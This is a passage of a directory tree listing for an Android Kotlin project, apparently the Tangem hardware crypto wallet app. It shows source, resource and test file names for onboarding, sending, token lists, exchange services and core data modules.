id,title,username,language,date,content
│       │   │               │   ├── home
│       │   │               │   │   ├── compose
│       │   │               │   │   │   ├── content
│       │   │               │   │   │   │   ├── Content.kt
│       │   │               │   │   │   │   ├── CurrenciesWeb3Content.kt
│       │   │               │   │   │   │   ├── FirstStoriesContent.kt
│       │   │               │   │   │   │   └── FloatingCardsContent.kt
│       │   │               │   │   │   ├── StoriesAnimation.kt
│       │   │               │   │   │   ├── StoriesScreen.kt
│       │   │               │   │   │   └── views
│       │   │               │   │   │       ├── HomeButtons.kt
│       │   │               │   │   │       ├── SearchCurrenciesButton.kt
│       │   │               │   │   │       ├── StoriesButton.kt
│       │   │               │   │   │       └── StoriesProgressBar.kt
│       │   │               │   │   ├── data
│       │   │               │   │   │   └── HomeRepositoryImpl.kt
│       │   │               │   │   ├── domain
│       │   │               │   │   │   └── HomeRepository.kt
│       │   │               │   │   ├── HomeFragment.kt
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── HomeAction.kt
│       │   │               │   │   │   ├── HomeMiddleware.kt
│       │   │               │   │   │   ├── HomeReducer.kt
│       │   │               │   │   │   └── HomeState.kt
│       │   │               │   │   └── RegionProvider.kt
│       │   │               │   ├── intentHandler
│       │   │               │   │   ├── handlers
│       │   │               │   │   │   ├── BackgroundScanIntentHandler.kt
│       │   │               │   │   │   └── WalletConnectLinkIntentHandler.kt
│       │   │               │   │   ├── IntentHandler.kt
│       │   │               │   │   └── IntentProcessor.kt
│       │   │               │   ├── main
│       │   │               │   │   ├── MainIntents.kt
│       │   │               │   │   ├── MainScreenStateHolder.kt
│       │   │               │   │   ├── MainViewModel.kt
│       │   │               │   │   ├── model
│       │   │               │   │   │   ├── ActionConfig.kt
│       │   │               │   │   │   ├── MainScreenState.kt
│       │   │               │   │   │   ├── ModalNotification.kt
│       │   │               │   │   │   └── Toast.kt
│       │   │               │   │   ├── NotificationsFactory.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── components
│       │   │               │   │       │   └── ModalNotificationScreen.kt
│       │   │               │   │       └── ModalNotificationBottomSheetFragment.kt
│       │   │               │   ├── onboarding
│       │   │               │   │   ├── OnboardingDialog.kt
│       │   │               │   │   ├── OnboardingHelper.kt
│       │   │               │   │   ├── OnboardingManager.kt
│       │   │               │   │   ├── OnboardingMenuProvider.kt
│       │   │               │   │   └── products
│       │   │               │   │       ├── BaseOnboardingFragment.kt
│       │   │               │   │       ├── note
│       │   │               │   │       │   ├── OnboardingNoteFragment.kt
│       │   │               │   │       │   └── redux
│       │   │               │   │       │       ├── OnboardingNoteAction.kt
│       │   │               │   │       │       ├── OnboardingNoteMiddleware.kt
│       │   │               │   │       │       ├── OnboardingNoteReducer.kt
│       │   │               │   │       │       └── OnboardingNoteState.kt
│       │   │               │   │       ├── otherCards
│       │   │               │   │       │   ├── OnboardingOtherCardsFragment.kt
│       │   │               │   │       │   └── redux
│       │   │               │   │       │       ├── OnboardingOtherCardsAction.kt
│       │   │               │   │       │       ├── OnboardingOtherCardsMiddleware.kt
│       │   │               │   │       │       ├── OnboardingOtherCardsReducer.kt
│       │   │               │   │       │       └── OnboardingOtherCardsState.kt
│       │   │               │   │       ├── twins
│       │   │               │   │       │   ├── redux
│       │   │               │   │       │   │   ├── TwinCardsAction.kt
│       │   │               │   │       │   │   ├── TwinCardsMiddleware.kt
│       │   │               │   │       │   │   ├── TwinCardsReducer.kt
│       │   │               │   │       │   │   └── TwinCardsState.kt
│       │   │               │   │       │   └── ui
│       │   │               │   │       │       ├── dialog
│       │   │               │   │       │       │   └── TwinningProcessNotCompletedDialog.kt
│       │   │               │   │       │       └── OnboardingTwinsFragment.kt
│       │   │               │   │       └── wallet
│       │   │               │   │           ├── redux
│       │   │               │   │           │   ├── OnboardingWalletAction.kt
│       │   │               │   │           │   ├── OnboardingWalletMiddleware.kt
│       │   │               │   │           │   ├── OnboardingWalletReducer.kt
│       │   │               │   │           │   └── OnboardingWalletState.kt
│       │   │               │   │           └── ui
│       │   │               │   │               ├── BackupAnimator.kt
│       │   │               │   │               ├── BackupInfoAdapter.kt
│       │   │               │   │               ├── dialogs
│       │   │               │   │               │   ├── AccessCodeDialog.kt
│       │   │               │   │               │   ├── AddMoreBackupCardsDialog.kt
│       │   │               │   │               │   ├── AttestationFailedDialog.kt
│       │   │               │   │               │   ├── BackupInProgressDialog.kt
│       │   │               │   │               │   ├── ConfirmDiscardingBackupDialog.kt
│       │   │               │   │               │   ├── InterruptOnboardingDialog.kt
│       │   │               │   │               │   ├── ResetBackupCardDialog.kt
│       │   │               │   │               │   ├── UnfinishedBackupFoundDialog.kt
│       │   │               │   │               │   └── WalletActivationErrorDialog.kt
│       │   │               │   │               ├── OnboardingSeedPhraseStateHandler.kt
│       │   │               │   │               ├── OnboardingWalletFragment.kt
│       │   │               │   │               └── WalletCardsWidget.kt
│       │   │               │   ├── saveWallet
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── SaveWalletAction.kt
│       │   │               │   │   │   ├── SaveWalletMiddleware.kt
│       │   │               │   │   │   ├── SaveWalletReducer.kt
│       │   │               │   │   │   └── SaveWalletState.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── components
│       │   │               │   │       │   ├── EnrollBiometricsDialogConent.kt
│       │   │               │   │       │   └── SaveWalletScreenContent.kt
│       │   │               │   │       ├── models
│       │   │               │   │       │   └── EnrollBiometricsDialog.kt
│       │   │               │   │       ├── SaveWalletBottomSheetFragment.kt
│       │   │               │   │       ├── SaveWalletScreenState.kt
│       │   │               │   │       └── SaveWalletViewModel.kt
│       │   │               │   ├── send
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── middlewares
│       │   │               │   │   │   │   ├── AddressMiddleware.kt
│       │   │               │   │   │   │   ├── AddressValidator.kt
│       │   │               │   │   │   │   ├── AmountMiddleware.kt
│       │   │               │   │   │   │   ├── RequestFeeMiddleware.kt
│       │   │               │   │   │   │   └── SendMiddleware.kt
│       │   │               │   │   │   ├── reducers
│       │   │               │   │   │   │   ├── AddressReducer.kt
│       │   │               │   │   │   │   ├── AmountReducer.kt
│       │   │               │   │   │   │   ├── FeeReducer.kt
│       │   │               │   │   │   │   ├── ReceiptReducer.kt
│       │   │               │   │   │   │   ├── SendScreenReducer.kt
│       │   │               │   │   │   │   └── TransactionExtrasReducer.kt
│       │   │               │   │   │   ├── SendScreenAction.kt
│       │   │               │   │   │   └── states
│       │   │               │   │   │       ├── AddressState.kt
│       │   │               │   │   │       ├── FeeState.kt
│       │   │               │   │   │       ├── ReceiptState.kt
│       │   │               │   │   │       └── SendState.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── adapters
│       │   │               │   │       │   └── WarningMessagesAdapter.kt
│       │   │               │   │       ├── dialogs
│       │   │               │   │       │   ├── ChiaWarningDialog.kt
│       │   │               │   │       │   ├── KaspaWarningDialog.kt
│       │   │               │   │       │   ├── RequestFeeErrorDialog.kt
│       │   │               │   │       │   ├── SendTransactionFailsDialog.kt
│       │   │               │   │       │   └── TezosWarningDialog.kt
│       │   │               │   │       ├── EditTextCustomPaste.kt
│       │   │               │   │       ├── SendFragment.kt
│       │   │               │   │       ├── SendViewModel.kt
│       │   │               │   │       └── stateSubscribers
│       │   │               │   │           ├── FragmentStateSubscriber.kt
│       │   │               │   │           └── SendStateSubscriber.kt
│       │   │               │   ├── tokens
│       │   │               │   │   ├── impl
│       │   │               │   │   │   ├── data
│       │   │               │   │   │   │   ├── converters
│       │   │               │   │   │   │   │   ├── CoinsResponseConverter.kt
│       │   │               │   │   │   │   │   └── TestnetTokensConfigConverter.kt
│       │   │               │   │   │   │   ├── DefaultTokensListRepository.kt
│       │   │               │   │   │   │   ├── TangemApiTokensPagingSource.kt
│       │   │               │   │   │   │   └── TestnetTokensPagingSource.kt
│       │   │               │   │   │   ├── di
│       │   │               │   │   │   │   ├── TokensListInteractorModule.kt
│       │   │               │   │   │   │   ├── TokensListRepositoryModule.kt
│       │   │               │   │   │   │   └── TokensListRouterModule.kt
│       │   │               │   │   │   ├── domain
│       │   │               │   │   │   │   ├── DefaultTokensListInteractor.kt
│       │   │               │   │   │   │   ├── models
│       │   │               │   │   │   │   │   └── Token.kt
│       │   │               │   │   │   │   ├── TokensListInteractor.kt
│       │   │               │   │   │   │   └── TokensListRepository.kt
│       │   │               │   │   │   └── presentation
│       │   │               │   │   │       ├── models
│       │   │               │   │   │       │   └── SupportTokensState.kt
│       │   │               │   │   │       ├── router
│       │   │               │   │   │       │   ├── DefaultTokensListRouter.kt
│       │   │               │   │   │       │   └── TokensListRouter.kt
│       │   │               │   │   │       ├── states
│       │   │               │   │   │       │   ├── NetworkItemState.kt
│       │   │               │   │   │       │   ├── TokenItemState.kt
│       │   │               │   │   │       │   ├── TokensListStateHolder.kt
│       │   │               │   │   │       │   └── TokensListToolbarState.kt
│       │   │               │   │   │       ├── TokensListFragment.kt
│       │   │               │   │   │       ├── ui
│       │   │               │   │   │       │   ├── BriefNetworksList.kt
│       │   │               │   │   │       │   ├── DetailedNetworksList.kt
│       │   │               │   │   │       │   ├── NetworkItemArrow.kt
│       │   │               │   │   │       │   ├── TokenItem.kt
│       │   │               │   │   │       │   ├── TokenListPreviewData.kt
│       │   │               │   │   │       │   ├── TokensListScreen.kt
│       │   │               │   │   │       │   └── TokensListToolbar.kt
│       │   │               │   │   │       └── viewmodels
│       │   │               │   │   │           ├── TokensListAnalyticsSender.kt
│       │   │               │   │   │           ├── TokensListCryptoCurrencies.kt
│       │   │               │   │   │           ├── TokensListMigration.kt
│       │   │               │   │   │           └── TokensListViewModel.kt
│       │   │               │   │   └── legacy
│       │   │               │   │       └── redux
│       │   │               │   │           ├── TokensReducer.kt
│       │   │               │   │           └── TokensState.kt
│       │   │               │   ├── wallet
│       │   │               │   │   └── redux
│       │   │               │   │       └── middlewares
│       │   │               │   │           └── TradeCryptoMiddleware.kt
│       │   │               │   └── welcome
│       │   │               │       ├── redux
│       │   │               │       │   ├── WelcomeAction.kt
│       │   │               │       │   ├── WelcomeMiddleware.kt
│       │   │               │       │   ├── WelcomeReducer.kt
│       │   │               │       │   └── WelcomeState.kt
│       │   │               │       └── ui
│       │   │               │           ├── components
│       │   │               │           │   ├── WarningDialog.kt
│       │   │               │           │   └── WelcomeScreenContent.kt
│       │   │               │           ├── model
│       │   │               │           │   └── WarningModel.kt
│       │   │               │           ├── WelcomeFragment.kt
│       │   │               │           ├── WelcomeScreenState.kt
│       │   │               │           └── WelcomeViewModel.kt
│       │   │               ├── ForegroundActivityObserver.kt
│       │   │               ├── LockUserWalletsTimer.kt
│       │   │               ├── MainActivity.kt
│       │   │               ├── NavBarInsetsFragmentLifecycleCallback.kt
│       │   │               ├── network
│       │   │               │   ├── auth
│       │   │               │   │   ├── DefaultAppVersionProvider.kt
│       │   │               │   │   ├── DefaultAuthProvider.kt
│       │   │               │   │   ├── DefaultExpressAuthProvider.kt
│       │   │               │   │   ├── DefaultStakeKitAuthProvider.kt
│       │   │               │   │   └── di
│       │   │               │   │       └── AuthModule.kt
│       │   │               │   └── exchangeServices
│       │   │               │       ├── BuyExchangeService.kt
│       │   │               │       ├── CardExchangeRules.kt
│       │   │               │       ├── CryptoCurrencyConverter.kt
│       │   │               │       ├── CurrencyExchangeManager.kt
│       │   │               │       ├── DefaultRampManager.kt
│       │   │               │       ├── ExchangeService.kt
│       │   │               │       ├── mercuryo
│       │   │               │       │   ├── MercuryoApi.kt
│       │   │               │       │   ├── MercuryoEnvironment.kt
│       │   │               │       │   └── MercuryoService.kt
│       │   │               │       └── moonpay
│       │   │               │           ├── BlockchainExt.kt
│       │   │               │           ├── models
│       │   │               │           │   ├── MoonPayAvailableCurrency.kt
│       │   │               │           │   └── MoonPaySupportedCurrency.kt
│       │   │               │           ├── MoonPayApi.kt
│       │   │               │           └── MoonPayService.kt
│       │   │               ├── proxy
│       │   │               │   ├── AppStateHolder.kt
│       │   │               │   ├── di
│       │   │               │   │   └── ProxyModule.kt
│       │   │               │   ├── redux
│       │   │               │   │   ├── DaggerGraphAction.kt
│       │   │               │   │   ├── DaggerGraphMiddleware.kt
│       │   │               │   │   ├── DaggerGraphReducer.kt
│       │   │               │   │   └── DaggerGraphState.kt
│       │   │               │   ├── TransactionManagerImpl.kt
│       │   │               │   └── UserWalletManagerImpl.kt
│       │   │               ├── TangemApplication.kt
│       │   │               └── TangemHiltApplication.kt
│       │   └── res
│       │       ├── color
│       │       │   ├── selector_btn_content_primary.xml
│       │       │   ├── selector_btn_content_secondary.xml
│       │       │   ├── selector_btn_primary.xml
│       │       │   ├── selector_btn_secondary.xml
│       │       │   ├── selector_chip_shop_text.xml
│       │       │   ├── selector_chip_shop.xml
│       │       │   ├── selector_chip_stroke.xml
│       │       │   ├── selector_chip_text.xml
│       │       │   ├── selector_edit_text_secondary.xml
│       │       │   └── selector_edit_text.xml
│       │       ├── drawable
│       │       │   ├── bg_half_transparent_overlay.xml
│       │       │   ├── buy_with_googlepay_button_content.xml
│       │       │   ├── card_placeholder_white.xml
│       │       │   ├── currency0.webp
│       │       │   ├── currency1.webp
│       │       │   ├── currency2.webp
│       │       │   ├── currency3.webp
│       │       │   ├── currency4.webp
│       │       │   ├── dapps1.webp
│       │       │   ├── dapps2.webp
│       │       │   ├── dapps3.webp
│       │       │   ├── dapps4.webp
│       │       │   ├── dapps5.webp
│       │       │   ├── googlepay_button_no_shadow_background.xml
│       │       │   ├── googlepay_button_overlay.xml
│       │       │   ├── ic_accepted.xml
│       │       │   ├── ic_access_code.xml
│       │       │   ├── ic_add_friends.xml
│       │       │   ├── ic_angle_bracket_up.xml
│       │       │   ├── ic_arrow_collapsed.xml
│       │       │   ├── ic_arrow_extended.xml
│       │       │   ├── ic_arrow_refresh.xml
│       │       │   ├── ic_arrow_right.xml
│       │       │   ├── ic_arrows_up_down.xml
│       │       │   ├── ic_back_24.xml
│       │       │   ├── ic_baseline_arrow_back_24.xml
│       │       │   ├── ic_card_settings.xml
│       │       │   ├── ic_check_24.xml
│       │       │   ├── ic_clear_24.xml
│       │       │   ├── ic_copy_green.xml
│       │       │   ├── ic_cross_rounded_24.xml
│       │       │   ├── ic_dot.xml
│       │       │   ├── ic_feature_1.xml
│       │       │   ├── ic_feature_2.xml
│       │       │   ├── ic_feature_3.xml
│       │       │   ├── ic_fingerprint_24.xml
│       │       │   ├── ic_hide_password.xml
│       │       │   ├── ic_launcher_foreground.xml
│       │       │   ├── ic_link.xml
│       │       │   ├── ic_locked_24.xml
│       │       │   ├── ic_more_cards.xml
│       │       │   ├── ic_paste_disabled.xml
│       │       │   ├── ic_paste.xml
│       │       │   ├── ic_qr_code_scan.xml
│       │       │   ├── ic_qr_code_show.xml
│       │       │   ├── ic_selected_dot.xml
│       │       │   ├── ic_settings.xml
│       │       │   ├── ic_share_chip.xml
│       │       │   ├── ic_show_password.xml
│       │       │   ├── ic_tangem_logo.xml
│       │       │   ├── ic_unticked.xml
│       │       │   ├── img_alert_80.xml
│       │       │   ├── img_card_placeholder_wallet_2.webp
│       │       │   ├── img_flag_ru_24.xml
│       │       │   ├── img_hand_scan_ring.xml
│       │       │   ├── img_onboarding_success.xml
│       │       │   ├── img_ring_placeholder.png
│       │       │   ├── img_tangem_logo_96.xml
│       │       │   ├── inset_splash.xml
│       │       │   ├── paste_selector.xml
│       │       │   ├── selector_password_toggle.xml
│       │       │   ├── selector_tabs_dots.xml
│       │       │   ├── shape_circle.xml
│       │       │   ├── shape_ellipse.xml
│       │       │   ├── shape_line.xml
│       │       │   ├── shape_rectangle_rounded_100.xml
│       │       │   ├── shape_rectangle_rounded_4.xml
│       │       │   ├── shape_rectangle_rounded_8.xml
│       │       │   ├── shape_refresh_button.xml
│       │       │   ├── shape_success_circle.xml
│       │       │   └── splash_logo.xml
│       │       ├── drawable-de
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-fr
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-hdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-it
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-mdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-ru
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-xhdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── googlepay_button_no_shadow_background_image.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-xxhdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── googlepay_button_no_shadow_background_image.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-xxxhdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── googlepay_button_no_shadow_background_image.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── font
│       │       │   ├── roboto_medium.ttf
│       │       │   ├── roboto.ttf
│       │       │   └── saira_semi_condensed_regular.ttf
│       │       ├── layout
│       │       │   ├── activity_main.xml
│       │       │   ├── btn_expand_collapse.xml
│       │       │   ├── buy_with_googlepay_button.xml
│       │       │   ├── dialog_onboarding_address_info.xml
│       │       │   ├── dialog_russians_cardholders_warning.xml
│       │       │   ├── fragment_disclaimer.xml
│       │       │   ├── fragment_onboarding_main.xml
│       │       │   ├── fragment_onboarding_wallet.xml
│       │       │   ├── fragment_send.xml
│       │       │   ├── item_backup_info_adapter.xml
│       │       │   ├── layout_backup_access_code_info.xml
│       │       │   ├── layout_backup_access_code_submit.xml
│       │       │   ├── layout_backup_access_code.xml
│       │       │   ├── layout_onboarding_buttons_add_cards.xml
│       │       │   ├── layout_onboarding_buttons_common.xml
│       │       │   ├── layout_onboarding_container_bottom.xml
│       │       │   ├── layout_onboarding_container_top.xml
│       │       │   ├── layout_onboarding_main.xml
│       │       │   ├── layout_onboarding_seed_phrase.xml
│       │       │   ├── layout_pseudo_toolbar.xml
│       │       │   ├── layout_receipt_total.xml
│       │       │   ├── layout_send_address.xml
│       │       │   ├── layout_send_amount.xml
│       │       │   ├── layout_send_fee.xml
│       │       │   ├── layout_send_receipt.xml
│       │       │   ├── layout_warning_card_action.xml
│       │       │   ├── layout_warning.xml
│       │       │   ├── lp_onboarding_create_wallet.xml
│       │       │   ├── lp_onboarding_done_activation_twins.xml
│       │       │   ├── lp_onboarding_done_activation.xml
│       │       │   ├── lp_onboarding_done.xml
│       │       │   ├── lp_onboarding_topup_wallet_twins.xml
│       │       │   ├── lp_onboarding_topup_wallet.xml
│       │       │   ├── test_leapfrog_fragment.xml
│       │       │   ├── test_leapfrog_widget.xml
│       │       │   ├── view_bg_twins_welcome.xml
│       │       │   ├── view_confetti.xml
│       │       │   ├── view_onboarding_card.xml
│       │       │   ├── view_onboarding_progress.xml
│       │       │   ├── view_onboarding_refresh_balance.xml
│       │       │   ├── view_onboarding_tv_balance.xml
│       │       │   ├── view_snackbar_max_amount_content.xml
│       │       │   └── view_snackbar_max_amount.xml
│       │       ├── layout-h680dp
│       │       │   └── layout_onboarding_container_bottom.xml
│       │       ├── menu
│       │       │   └── menu_onboarding.xml
│       │       ├── mipmap-anydpi-v26
│       │       │   └── ic_launcher.xml
│       │       ├── mipmap-hdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-mdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-xhdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-xxhdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-xxxhdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── raw
│       │       │   └── anim_confetti.json
│       │       ├── values
│       │       │   ├── attrs.xml
│       │       │   ├── bool.xml
│       │       │   ├── colors.xml
│       │       │   ├── dimens.xml
│       │       │   ├── googlepay_strings.xml
│       │       │   ├── strings.xml
│       │       │   └── styles.xml
│       │       ├── values-h680dp
│       │       │   └── dimens.xml
│       │       ├── values-night
│       │       │   └── colors.xml
│       │       ├── values-v24
│       │       │   └── bool.xml
│       │       ├── values-v29
│       │       │   └── styles.xml
│       │       └── xml
│       │           ├── network_security_config.xml
│       │           └── provider_paths.xml
│       ├── mocked
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       └── test
│           └── kotlin
│               └── com
│                   └── tangem
│                       └── tap
│                           └── domain
│                               └── card
│                                   ├── CryptoCurrenciesMocks.kt
│                                   ├── DefaultDerivationsRepositoryTest.kt
│                                   ├── DerivedKeysMocks.kt
│                                   ├── MissedDerivationsFinderTest.kt
│                                   └── ScanResponseMockFactory.kt
├── build.gradle.kts
├── common
│   ├── build.gradle.kts
│   └── src
│       └── main
│           └── java
│               └── com
│                   └── tangem
│                       └── common
│                           ├── module
│                           │   ├── ModuleErrorCode.kt
│                           │   └── ModuleMessage.kt
│                           └── Strings.kt
├── core
│   ├── analytics
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── core
│   │   │                           └── analytics
│   │   │                               └── models
│   │   │                                   ├── AnalyticsEvent.kt
│   │   │                                   ├── AnalyticsParam.kt
│   │   │                                   ├── Basic.kt
│   │   │                                   └── OneTimeAnalyticsEvent.kt
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── core
│   │                           └── analytics
│   │                               ├── Analytics.kt
│   │                               ├── api
│   │                               │   ├── ClientApi.kt
│   │                               │   ├── EventFilterApi.kt
│   │                               │   ├── EventHandlerApi.kt
│   │                               │   └── ParamsInterceptorApi.kt
│   │                               ├── di
│   │                               │   └── AnalyticsModule.kt
│   │                               └── filter
│   │                                   └── OneTimeEventFilter.kt
│   ├── datasource
│   │   ├── build.gradle.kts
│   │   ├── schemas
│   │   │   └── com.tangem.datasource.local.db.TangemDatabase
│   │   │       └── 1.json
│   │   └── src
│   │       ├── main
│   │       │   ├── AndroidManifest.xml
│   │       │   └── java
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── datasource
│   │       │                   ├── api
│   │       │                   │   ├── common
│   │       │                   │   │   ├── adapter
│   │       │                   │   │   │   ├── BigDecimalAdapter.kt
│   │       │                   │   │   │   ├── DateTimeAdapter.kt
│   │       │                   │   │   │   ├── LocalDateAdapter.kt
│   │       │                   │   │   │   └── UnknownEnumMoshiAdapter.kt
│   │       │                   │   │   ├── AuthProvider.kt
│   │       │                   │   │   ├── MoshiConverter.kt
│   │       │                   │   │   ├── response
│   │       │                   │   │   │   ├── ApiResponseCallAdapterFactory.kt
│   │       │                   │   │   │   ├── ApiResponseCallAdapter.kt
│   │       │                   │   │   │   ├── ApiResponseCallDelegate.kt
│   │       │                   │   │   │   ├── ApiResponseError.kt
│   │       │                   │   │   │   ├── ApiResponseExt.kt
│   │       │                   │   │   │   ├── ApiResponse.kt
│   │       │                   │   │   │   └── ResponseExt.kt
│   │       │                   │   │   └── Retrofit.kt
│   │       │                   │   ├── express
│   │       │                   │   │   ├── models
│   │       │                   │   │   │   ├── request
│   │       │                   │   │   │   │   ├── AssetsRequestBody.kt
│   │       │                   │   │   │   │   ├── LeastTokenInfo.kt
│   │       │                   │   │   │   │   └── PairsRequestBody.kt
│   │       │                   │   │   │   ├── response
│   │       │                   │   │   │   │   ├── Asset.kt
│   │       │                   │   │   │   │   ├── ExchangeDataResponse.kt
│   │       │                   │   │   │   │   ├── ExchangeProvider.kt
│   │       │                   │   │   │   │   ├── ExchangeQuoteResponse.kt
│   │       │                   │   │   │   │   ├── ExchangeStatusResponse.kt
│   │       │                   │   │   │   │   ├── ExpressErrorResponse.kt
│   │       │                   │   │   │   │   ├── SwapPair.kt
│   │       │                   │   │   │   │   └── SwapPairsWithProviders.kt
│   │       │                   │   │   │   └── TangemExpressValues.kt
│   │       │                   │   │   └── TangemExpressApi.kt
│   │       │                   │   ├── promotion
